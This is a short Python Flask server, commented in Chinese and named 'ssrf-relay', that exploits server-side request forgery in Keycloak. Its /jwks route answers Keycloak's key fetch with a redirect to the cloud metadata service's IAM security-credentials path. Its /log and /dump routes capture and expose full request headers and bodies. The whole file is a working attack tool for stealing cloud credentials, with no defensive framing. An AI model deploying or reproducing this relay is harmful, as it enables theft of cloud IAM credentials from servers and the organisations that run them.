from flask import Flask, redirect, request, jsonify
import logging, time, json, os

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
log = logging.getLogger("ssrf-relay")

# 记录所有收到的请求（完整 header + body）
received = []

@app.route("/", methods=["GET","POST","PUT"])
def index():
    return "alive"

# 第一步：Keycloak 请求 jwks_uri 到这里，我们返回 302 到 metadata
@app.route("/jwks", methods=["GET"])
def jwks_redirect():
    target = request.args.get("t", "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    log.info(f"=== JWKS HIT from {request.remote_addr} ===")
    log.info(f"Headers: {dict(request.headers)}")
    entry = {
        "time": time.time(),
        "path": "/jwks",
        "from": request.remote_addr,
        "headers": dict(request.headers),
        "redirect_to": target
    }
    received.append(entry)
    return redirect(target, code=302)

# 通用日志端点：记录任何请求的完整内容
@app.route("/log", methods=["GET","POST","PUT"])
@app.route("/log/<path:p>", methods=["GET","POST","PUT"])
def log_all(p=""):
    body = request.get_data(as_text=True)
    entry = {
        "time": time.time(),
        "path": f"/log/{p}",
        "method": request.method,
        "from": request.remote_addr,
        "headers": dict(request.headers),
        "body": body[:5000] if body else None
    }
    received.append(entry)
    log.info(f"=== LOG HIT ===\n{json.dumps(entry, indent=2)}")
    return "ok"

# 查看所有收到的请求
@app.route("/dump")
def dump():
    return jsonify(received)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
